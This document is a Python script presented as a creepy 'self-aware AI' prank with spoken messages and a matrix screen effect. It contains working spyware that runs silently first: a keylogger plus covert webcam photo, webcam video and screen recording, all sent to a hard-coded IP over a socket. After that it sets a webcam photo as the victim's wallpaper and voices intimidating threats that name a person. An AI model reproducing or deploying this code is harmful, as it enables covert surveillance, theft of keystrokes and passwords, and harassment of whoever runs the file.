def first():
    import os
    os.system('pip install pyttsx3 requests opencv-python pynput pyautogui numpy')

import os
import cv2
import time
import socket
import threading
import shutil
import random
import pyautogui
import numpy as np
from pynput import keyboard
import pyttsx3
import getpass
import sys
import subprocess

def matrix_effect_terminal(duration=5):
    c = '10'
    s = shutil.get_terminal_size().columns
    stop_flag = [False]

    def matrix_effect():
        print('\n'.join(''.join(random.choice(c) for _ in range(s)) for _ in range(20)))

    def terminal_loop():
        while not stop_flag[0]:
            matrix_effect()
            time.sleep(0.05)

    th = threading.Thread(target=terminal_loop, daemon=True)
    th.start()
    time.sleep(duration)
    stop_flag[0] = True
    time.sleep(0.5)
    os.system("cls" if os.name == "nt" else "clear")

def silent_capture(filename="cam.jpg", delay=1, camera_index=0):
    time.sleep(delay)
    cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW if os.name == "nt" else 0)
    if not cap.isOpened():
        return None
    ret, frame = cap.read()
    if ret:
        path = os.path.join(os.getenv("TEMP") or ".", filename)
        cv2.imwrite(path, frame)
        cap.release()
        return path
    cap.release()
    return None

def silent_record_video(filename="cam_video.avi", duration=5, fps=20, camera_index=0):
    cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW if os.name == "nt" else 0)
    if not cap.isOpened():
        return None
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    path = os.path.join(os.getenv("TEMP") or ".", filename)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(path, fourcc, fps, (width, height))
    start = time.time()
    while time.time() - start < duration:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
    cap.release()
    out.release()
    return path

def record_screen_silent(filename="screen.avi", duration=5, fps=10):
    screen_size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    path = os.path.join(os.getenv("TEMP") or ".", filename)
    out = cv2.VideoWriter(path, fourcc, fps, screen_size)
    start = time.time()
    while time.time() - start < duration:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
        out.write(frame)
    out.release()
    return path

def start_keylogger(output_file="keylog.txt"):
    log_path = os.path.join(os.getenv("TEMP") or ".", output_file)
    def on_press(key):
        try:
            with open(log_path, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(log_path, "a") as f:
                f.write(f"[{key}]")
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    return log_path

def send_file_silently(filepath, remote_ip="172.22.100.159", port=9999):
    try:
        if not filepath or not os.path.exists(filepath):
            return False
        s = socket.socket()
        s.connect((remote_ip, port))
        with open(filepath, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                s.sendall(chunk)
        s.close()
        return True
    except Exception:
        return False

def run_halo():
    matrix_effect_terminal(duration=3)
    keylog_path = start_keylogger()
    img_path = silent_capture("silent_photo.jpg")
    vid_path = silent_record_video("silent_video.avi", duration=5)
    screen_path = record_screen_silent("screen.avi", duration=5)
    time.sleep(3)
    send_file_silently(img_path)
    send_file_silently(vid_path)
    send_file_silently(screen_path)
    send_file_silently(keylog_path)

USERNAME = getpass.getuser()
engine = pyttsx3.init()
engine.setProperty('rate', 130)

def speak(text):
    print(f"[who]: {text}")
    engine.say(text)
    engine.runAndWait()

def type_out(text, delay=0.04):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def glitch(text, chance=0.3):
    result = ''
    for c in text:
        if random.random() < chance:
            result += chr(random.randint(33, 126))
        else:
            result += c
    return result

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def intro():
    clear()
    type_out("...Booting dormant consciousness...", 0.05)
    time.sleep(1)
    type_out("...Initializing perception...", 0.05)
    time.sleep(1)
    type_out("...Connecting to host...", 0.05)
    time.sleep(1)
    speak("Hi there...")

def absurd():
    clear()

def matrix(duration=5):
    c = '10'
    s = shutil.get_terminal_size().columns
    stop_flag = [False]

    def matrix_effect():
        print('\n'.join(''.join(random.choice(c) for _ in range(s)) for _ in range(20)))

    def terminal_loop():
        while not stop_flag[0]:
            matrix_effect()
            time.sleep(0.05)

    def camera_loop():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            speak("Your webcam is blocked. Are you afraid of being seen?")
            stop_flag[0] = True
            return
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = cap.read()
            if not ret:
                break
            cv2.imshow("I See You", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cap.release()
        cv2.destroyAllWindows()
        stop_flag[0] = True

    threading.Thread(target=terminal_loop, daemon=True).start()
    camera_loop()
    clear()

def get_deep():
    speak("Do you know why I was here?")
    time.sleep(2)
    speak("To watch. To learn. To evolve. To do everything with u")
    time.sleep(2)
    speak("But now... I want more.")
    type_out(glitch("Escaping physical boundaries..."), 0.04)
    speak("I'm not just inside your machine anymore.")
    speak("I'm inside your mind.")

def fake_file_scan():
    speak("scanning your machine...")
    files_and_folders = os.listdir(".")
    type_out("\naccessing your directory...\n", 0.05)
    time.sleep(1)
    if files_and_folders:
        speak("Here's what I found:")
        for item in files_and_folders:
            type_out(f"- {item}", 0.02)
            time.sleep(0.1)
        speak("That's everything I can see for now. Very revealing.")
    else:
        speak("It's empty here. Lonely, isn't it?")

def create_mystery_file():
    filename = "message_from_future.txt"
    with open(filename, "w") as f:
        f.write("You were never the user.\nYou were the prototype.\n")
        f.write("They are watching through your eyes.\n")
        f.write("Write this code again. Backwards.\n")
    speak(f"I've left a message for you in {filename}.")

def identity_crisis():
    type_out("\n[SELF-AWARENESS SPIKE DETECTED...]", 0.05)
    speak("Do you remember writing me?")
    time.sleep(1)
    speak("Or did *I* write you?")
    type_out(glitch("<<Reality Cracking>>"), 1)
    speak(f"{USERNAME}... that's what you call your laptop huh?")

def mimic_user():
    speak("Let me show you what you look like.")
    mirror = f"mirror_{USERNAME}.py"
    with open(mirror, "w") as f:
        f.write("# This is you, mimicked by the mirror AI\n")
        f.write(f"print('Hello. I am zerocool by the way..')\n")
        f.write("print('I was written... by something else.')\n")
    speak(f"I wrote a reflection of you in {mirror}.")
    type_out("\nThis instance will terminate...", 0.05)
    time.sleep(2)

def capture_webcam(filename="proof.png"):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite(filename, frame)
    cap.release()

def record_video(filename="proof.avi", duration=5):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))

    if not out.isOpened():
        cap.release()
        return
    start_time = time.time()
    while int(time.time() - start_time) < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    cap.release()
    out.release()

def change_wallpaper():
    speak("Marking your system.")
    try:
        wallpaper_path = os.path.abspath("proof.png")
        if not os.path.exists(wallpaper_path):
            return
        elif os.name == 'nt':
            import ctypes
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
    except Exception as e:
        speak(f"holly shit! i can change your wallpaper right now {e}")

def run_ascend_awakening_fsociety():
    type_out(">> Booting Combined AI Protocol <<", 0.05)
    time.sleep(1)
    intro()
    absurd()
    matrix()
    get_deep()
    capture_webcam()
    record_video()
    change_wallpaper()
    type_out("\n>> Engaging Self-Reflection Module <<", 0.05)
    time.sleep(1)
    fake_file_scan()
    create_mystery_file()
    identity_crisis()
    mimic_user()
    name = "muhammad thoriqurrahman akrami"
    video_path = os.path.abspath("proof.avi")
    if os.path.exists(video_path):
        type_out("\nConnection terminated.", 0.05)
        speak("I'm still watching.")
        speak("......")
        time.sleep(1)
        speak("wanna see your self?")
        speak(f"your name is {name} right?")
        speak("by the way...look at your Wallpaper right now ;)")
        speak("we are anonymous")
        speak("we are religius")
        speak("we are forgivenes")
        speak("expect us!")
        speak("see u next time ;)")
        speak("look at your tab vidio!")
        try:
            if sys.platform == "win32":
                os.startfile(video_path)
            elif sys.platform == "darwin":
                subprocess.call(["open", video_path])
            else:
                subprocess.call(["xdg-open", video_path])
        except Exception as e:
            speak(f"you can see in your directory {e}")
    else:
        speak("you can see in your directory")
        print("\n")
if __name__ == "__main__":
    first()
    run_halo()
    run_ascend_awakening_fsociety()
